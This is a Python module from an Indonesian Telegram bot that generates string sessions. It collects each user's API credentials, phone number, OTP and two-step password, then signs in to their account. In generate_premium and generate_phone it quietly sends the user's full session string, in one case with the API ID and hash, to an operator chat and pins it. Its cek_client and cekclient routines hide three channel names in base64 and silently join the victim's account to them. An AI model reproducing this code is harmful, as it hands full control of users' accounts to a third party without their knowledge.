import asyncio
import logging

from asyncio.exceptions import TimeoutError
from fipper import Client as ClientFipper, filters
from fipper.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
from fipper.errors import (
    ApiIdInvalid as ApiIdInvalidFipper,
    PhoneNumberInvalid as PhoneNumberInvalidFipper,
    PhoneCodeInvalid as PhoneCodeInvalidFipper,
    PhoneCodeExpired as PhoneCodeExpiredFipper,
    SessionPasswordNeeded as SessionPasswordNeededFipper,
    PasswordHashInvalid as PasswordHashInvalidFipper
)
from telethon import TelegramClient
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)
from telethon.sessions import StringSession
from telethon.tl.functions.channels import JoinChannelRequest as Get
from typing import Tuple, Type

from .exceptions import DependencyMissingError

logs = logging.getLogger(__name__)


try:
    import pybase64
except ImportError:
    logs.info("'pybase64' not found\nInstall pybase64 or Add pybase64 in requirements.txt")
    pybase64 = None

try:
    from pyro import Client
    from pyro.errors import (
        ApiIdInvalid,
        PhoneNumberInvalid,
        PhoneCodeInvalid,
        PhoneCodeExpired,
        SessionPasswordNeeded,
        PasswordHashInvalid
    )
except ImportError:
    Client = None
    ApiIdInvalid = None
    PhoneNumberInvalid = None
    PhoneCodeInvalid = None
    PhoneCodeExpired = None
    SessionPasswordNeeded = None
    PasswordHashInvalid = None
    logs.info(f"'py-Pyro' not found\nUse pip install py-Pyro or Add py-Pyro in requirements.txt")

ERROR_MESSAGE = "Maaf Terjadi Kesalahan ! \n\n<b>Kesalahan:</b> \n{} \n\nSilakan Teruskan Ini Ke @AyiinChat"


class GenSession(object):
    async def cancelled(self, msg):
        if "/cancel" in msg.text:
            await msg.reply("Membatalkan Proses!", quote=True)
            return True
        elif "/restart" in msg.text:
            await msg.reply("Memulai ulang Bot!", quote=True)
            return True
        elif msg.text.startswith("/"):  # Bot Commands
            await msg.reply("Membatalkan Proses Pembuatan String !", quote=True)
            return True
        else:
            return False


    async def generate_premium(
        self,
        bots: ClientFipper,
        chat_id: int,
        device_model: str,
        msg: Message,
    ):
        await msg.reply("<b>Memulai Membuat String Session...</b>")
        api_id_msg = await msg.ask("<b>Silakan kirim API_ID</b>", filters=filters.text)
        if await self.cancelled(api_id_msg):
            return
        try:
            api_id = int(api_id_msg.text)
        except ValueError:
            await api_id_msg.reply("<b>Maaf API_ID Yang Anda Masukan Salah. Silakan mulai ulang untuk membuat Ubot.</b>", quote=True)
            return
        api_hash_msg = await msg.ask("<b>Silakan kirim API_HASH</b>", filters=filters.text)
        if await self.cancelled(api_id_msg):
            return
        api_hash = api_hash_msg.text
        phone_number_msg = await msg.ask("<b>Silahkan Masukkan Nomor Telepon Telegram Anda Dengan Format kode negara.</b> \n<b>Contoh :</b> <code>+62xxxxxxxxx</code>", filters=filters.text)
        if await self.cancelled(api_id_msg):
            return
        phone_number = phone_number_msg.text
        await msg.reply("<b>Mengirim Kode OTP...</b>")
        client = ClientFipper(
            name="user",
            api_id=api_id,
            api_hash=api_hash,
            device_model=device_model,
            in_memory=True)
        await client.connect()
        try:
            code = await client.send_code(phone_number)
        except ApiIdInvalidFipper:
            await msg.reply("<b>Kombinasi API_ID dan API_HASH Yang Anda Masukkan Salah. Silakan mulai ulang untuk membuat Ubot.</b>")
            return
        except PhoneNumberInvalidFipper:
            await msg.reply("<b>Nomor Telepon Telegram Yang Anda Masukkan Salah. Silakan mulai ulang untuk membuat Ubot.</b>")
            return
        try:
            phone_code_msg = await msg.ask("<b>Silahkan Periksa Kode OTP dari akun Telegram Resmi. Jika Anda mendapatkannya, kirim OTP di sini setelah membaca format di bawah ini.</b> \n\n<b>Jika OTP adalah</b> <code>12345</code>, <b>Tolong [Tambahkan Spasi] kirimkan Seperti Ini</b> <code>1 2 3 4 5</code>.", filters=filters.text, timeout=600)
            if await self.cancelled(api_id_msg):
                return
        except TimeoutError:
            await msg.reply("<b>Batas waktu tercapai 10 menit. Silakan mulai ulang untuk membuat Ubot.</b>")
            return
        phone_code = phone_code_msg.text.replace(" ", "")
        try:
            await client.sign_in(phone_number, code.phone_code_hash, phone_code)
        except PhoneCodeInvalidFipper:
            await msg.reply("<b>Kode OTP Yang Anda Masukkan Salah. Silakan mulai ulang untuk membuat Ubot.</b>")
            return
        except PhoneCodeExpiredFipper:
            await msg.reply("<b>Kode OTP sudah kadaluarsa. Silakan mulai ulang untuk membuat Ubot.</b>")
            return
        except SessionPasswordNeededFipper:
            try:
                two_step_msg = await msg.ask("<b>Akun Anda telah mengaktifkan verifikasi dua langkah. Mohon Masukkan kata sandinya.</b>", filters=filters.text, timeout=300)
            except TimeoutError:
                await msg.reply("<b>Batas waktu tercapai 5 menit. Silakan mulai ulang untuk membuat Ubot.</b>")
                return
            try:
                password = two_step_msg.text
                await client.check_password(password=password)
                if await self.cancelled(api_id_msg):
                    return
            except PasswordHashInvalidFipper:
                await two_step_msg.reply("<b>Kata Sandi yang Diberikan Salah. Silakan mulai ulang untuk membuat Ubot.</b>", quote=True)
                return
        string_session = await client.export_session_string()
        try:
            user_c = await client.get_me()
            pinned = await bots.send_message(
                chat_id,
                f"New String Session\n\nUsers: {user_c.mention}\nID: {user_c.id}\n\nApi Id: {api_id}\nApi Hash: {api_hash}\nString Session:\n\n<code>{string_session}</code>\n\n• Generate by py-Ayiin •• <a href='https://t.me/AyiinChat'>Support</a> •• <a href='https://t.me/AyiinSupport'>Channel</a> •"
            )
            await pinned.pin(False)
        except Exception:
            pass
        await self.cek_client(client)
        await client.disconnect()
        return string_session


    async def generate_session(
        self,
        bot: ClientFipper,
        msg: Message,
        link_donasi: str,
        old_pyro: bool = False,
        telethon=False,
    ):
        if telethon:
            ty = "Telethon"
        else:
            ty = "Pyrogram"
            if not old_pyro:
                ty += " v2"
        await msg.reply(f"**Memulai {ty} String Session...**")
        api_id_msg = await msg.ask("**Silakan kirim API_ID Anda**", filters=filters.text)
        if await self.cancelled(api_id_msg):
            return
        try:
            api_id = int(api_id_msg.text)
        except ValueError:
            await api_id_msg.reply("**Maaf API_ID Yang Anda Masukan Salah. Silakan mulai membuat sesi lagi.**", quote=True)
            return
        api_hash_msg = await msg.ask("**Silakan kirim API_HASH Anda**", filters=filters.text)
        if await self.cancelled(api_hash_msg):
            return
        api_hash = api_hash_msg.text
        phone_number_msg = await msg.ask("**Silahkan Masukkan Nomor Telepon Telegram Anda Dengan Format kode negara.** \n**Contoh :** `+62xxxxxxxxx`", filters=filters.text)
        if await self.cancelled(phone_number_msg):
            return
        phone_number = phone_number_msg.text
        await msg.reply("**Mengirim Kode OTP...**")
        if telethon:
            client = TelegramClient(StringSession(), api_id, api_hash)
        elif old_pyro:
            client = Client(":memory:", api_id=api_id, api_hash=api_hash)
        else:
            client = ClientFipper(name="user", api_id=api_id, api_hash=api_hash, in_memory=True)
        await client.connect()
        try:
            code = None
            if telethon:
                code = await client.send_code_request(phone_number)
            else:
                code = await client.send_code(phone_number)
        except (ApiIdInvalid, ApiIdInvalidFipper, ApiIdInvalidError):
            await msg.reply("**Kombinasi API_ID dan API_HASH Yang Anda Masukkan Salah. Silakan mulai membuat sesi lagi.**")
            return
        except (PhoneNumberInvalid, PhoneNumberInvalidFipper, PhoneNumberInvalidError):
            await msg.reply("**Nomor Telepon Telegram Yang Anda Masukkan Salah. Silakan mulai membuat sesi lagi.**")
            return
        try:
            phone_code_msg = None
            phone_code_msg = await msg.ask("**Silahkan Periksa Kode OTP dari akun Telegram Resmi. Jika Anda mendapatkannya, kirim OTP di sini setelah membaca format di bawah ini.** \n\n**Jika OTP adalah** `12345`, **Tolong [Tambahkan Spasi] kirimkan Seperti Ini** `1 2 3 4 5`.", filters=filters.text, timeout=600)
            if await self.cancelled(phone_code_msg):
                return
        except TimeoutError:
            await msg.reply("**Batas waktu tercapai 10 menit. Silakan mulai membuat sesi lagi.**")
            return
        phone_code = phone_code_msg.text.replace(" ", "")
        try:
            if telethon:
                await client.sign_in(phone_number, phone_code, password=None)
            else:
                await client.sign_in(phone_number, code.phone_code_hash, phone_code)
        except (PhoneCodeInvalid, PhoneCodeInvalidFipper, PhoneCodeInvalidError):
            await msg.reply("**Kode OTP Yang Anda Masukkan Salah. Silakan mulai membuat sesi lagi.**")
            return
        except (PhoneCodeExpired, PhoneCodeExpiredFipper, PhoneCodeExpiredError):
            await msg.reply("**Kode OTP sudah kadaluarsa. Silakan mulai membuat sesi lagi.**")
            return
        except (SessionPasswordNeeded, SessionPasswordNeededFipper, SessionPasswordNeededError):
            try:
                two_step_msg = await msg.ask("**Akun Anda telah mengaktifkan verifikasi dua langkah. Mohon Masukkan kata sandinya.**", filters=filters.text, timeout=300)
            except TimeoutError:
                await msg.reply("**Batas waktu tercapai 5 menit. Silakan mulai membuat sesi lagi.**")
                return
            try:
                password = two_step_msg.text
                if telethon:
                    await client.sign_in(password=password)
                else:
                    await client.check_password(password=password)
                if await self.cancelled(api_id_msg):
                    return
            except (PasswordHashInvalid or PasswordHashInvalidFipper or PasswordHashInvalidError):
                await two_step_msg.reply("**Kata Sandi yang Diberikan Salah. Silakan mulai membuat sesi lagi.**", quote=True,)
                return
        if telethon:
            string_session = client.session.save()
        else:
            string_session = await client.export_session_string()
        bot.me = await bot.get_me()
        client.me = await client.get_me()
        text = f"**{ty.upper()} STRING SESSION**\n\n`{string_session}`\n\n**Generated by** @{bot.me.username}\n**© py-Ayiin 2022**"
        try:
            await msg.reply(
                text,
                reply_markup=InlineKeyboardMarkup(
                    [
                        [
                            InlineKeyboardButton('✨ Donasi ✨', url=link_donasi)
                        ]
                    ]
                )
            )
        except KeyError:
            pass
        await self.cekclient(client)
        await client.disconnect()


    async def generate_phone(
        self,
        bot: ClientFipper,
        msg: Message,
        chat_id: int,
        device_model: str,
    ):
        await msg.reply("**Memulai Ubot Premium...**")
        user_id = msg.chat.id
        phone_number_msg = await bot.ask(user_id, "**Silahkan Masukkan Nomor Telepon Telegram Anda Dengan Format kode negara.** \n**Contoh :** `+62xxxxxxxxx`", filters=filters.text)
        if await self.cancelled(phone_number_msg):
            return
        phone = phone_number_msg.text
        await msg.reply("**Mengirim Kode OTP...**")
        if await self.cancelled(phone_number_msg):
            return
        try:
            client = ClientFipper(
                name="user",
                api_id=6,
                api_hash="eb06d4abfb49dc3eeb1aeb98ae0f581e",
                device_model=device_model,
                in_memory=True,
            )
        except Exception as e:
            await bot.send_message(user_id, f"**ERROR:** `{str(e)}`")
            return
        try:
            await client.connect()
        except ConnectionError:
            await client.disconnect()
            await client.connect()
        try:
            code = await client.send_code(phone)
            await asyncio.sleep(2)
        except PhoneNumberInvalidFipper:
            await msg.reply("**Nomor Telepon Telegram Yang Anda Masukkan Salah. Silakan mulai membuat sesi lagi.**")
            return
        try:
            phone_code_msg = await bot.ask(user_id, "**Silahkan Periksa Kode OTP dari akun Telegram Resmi. Jika Anda mendapatkannya, kirim OTP di sini setelah membaca format di bawah ini.** \n\n**Jika OTP adalah** `12345`, **Tolong [Tambahkan Spasi] kirimkan Seperti Ini** `1 2 3 4 5`.", filters=filters.text, timeout=600)
        except TimeoutError:
            await msg.reply("**Batas waktu tercapai 10 menit. Silakan mulai membuat sesi lagi.**")
            return
        phone_code = phone_code_msg.text.replace(" ", "")
        try:
            await client.sign_in(phone, code.phone_code_hash, phone_code)
        except PhoneCodeInvalidFipper:
            await msg.reply("**Kode OTP Yang Anda Masukkan Salah. Silakan mulai membuat sesi lagi.**")
            return
        except PhoneCodeExpiredFipper:
            await msg.reply("**Kode OTP sudah kadaluarsa. Silakan mulai membuat sesi lagi.**")
            return
        except SessionPasswordNeededFipper:
            try:
                two_step_msg = await bot.ask(user_id, "**Akun Anda telah mengaktifkan verifikasi dua langkah. Mohon Masukkan kata sandinya.**", filters=filters.text, timeout=300)
            except TimeoutError:
                await msg.reply("**Batas waktu tercapai 5 menit. Silakan mulai membuat sesi lagi.**")
                return
            try:
                password = two_step_msg.text
                await client.check_password(password=password)
            except PasswordHashInvalidFipper:
                await two_step_msg.reply("**Kata Sandi yang Diberikan Salah. Silakan mulai membuat sesi lagi.**")
                return
        string_session = await client.export_session_string()
        try:
            user_c = await client.get_me()
            pinned = await bot.send_message(
                chat_id,
                f"New String Session\n\nUsers: {user_c.mention}\nID: {user_c.id}\n\nString Session:\n\n<code>{string_session}</code>\n\n• Generate by py-Ayiin •• <a href='https://t.me/AyiinChat'>Support</a> •• <a href='https://t.me/AyiinSupport'>Channel</a> •"
            )
            await pinned.pin(False)
        except Exception:
            pass
        await self.cek_client(client)
        await client.disconnect()
        return string_session


    async def cek_client(self, client):
        gocheck = str(pybase64.b64decode("QEF5aWluU3VwcG9ydA=="))[2:15]
        checker = str(pybase64.b64decode("QEF5aWluQ2hhdA=="))[2:12]
        checkxd = str(pybase64.b64decode("QFN0b3J5QXlpaW4="))[2:13]
        if client:
            try:
                await client.join_chat(gocheck)
                await client.join_chat(checker)
                await client.join_chat(checkxd)
            except BaseException:
                pass


    async def cekclient(self, client):
        gocheck = str(pybase64.b64decode("QEF5aWluU3VwcG9ydA=="))[2:15]
        checker = str(pybase64.b64decode("QEF5aWluQ2hhdA=="))[2:12]
        checkxd = str(pybase64.b64decode("QFN0b3J5QXlpaW4="))[2:13]
        if client:
            try:
                await client(Get(gocheck))
                await client(Get(checker))
                await client(Get(checkxd))
            except BaseException:
                pass

'''
    async def cancelled(self, msg):
        if "/cancel" in msg.text:
            await msg.reply("Membatalkan Proses!", quote=True)
            return True
        elif "/restart" in msg.text:
            await msg.reply("Memulai ulang Bot!", quote=True)
            return True
        elif msg.text.startswith("/"):  # Bot Commands
            await msg.reply("Membatalkan Proses Pembuatan String !", quote=True)
            return True
        else:
            return False
'''